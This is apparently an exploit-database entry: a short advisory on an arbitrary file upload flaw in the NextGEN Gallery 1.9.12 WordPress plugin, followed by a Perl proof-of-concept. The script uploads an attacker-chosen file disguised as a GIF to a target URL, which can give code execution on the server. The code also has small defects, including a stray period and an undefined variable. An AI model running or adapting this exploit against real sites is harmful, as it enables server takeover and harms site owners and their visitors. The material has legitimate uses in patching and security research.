The NextGEN Gallery plugin for WordPress is prone to a vulnerability that lets attackers upload arbitrary files.

An attacker may leverage this issue to upload arbitrary files to the affected computer; this can result in an arbitrary code execution within the context of the vulnerable application.

NextGEN Gallery 1.9.12 is vulnerable; other versions may also be affected.

#! /usr/bin/perl
use LWP;
use HTTP::Request::Common;

my ($url, $file) = @ARGV;

my $ua = LWP::UserAgent->new();
my $req = POST $url,
Content_Type => 'form-data',
Content => [.
name => $name,
galleryselect => 1, # Gallery ID, should exist
Filedata => [ "$file", "file.gif", Content_Type =>
'image/gif' ]
];
my $res = $ua->request( $req );
if( $res->is_success ) {
print $res->content;
} else {
print $res->status_line, "\n";
}
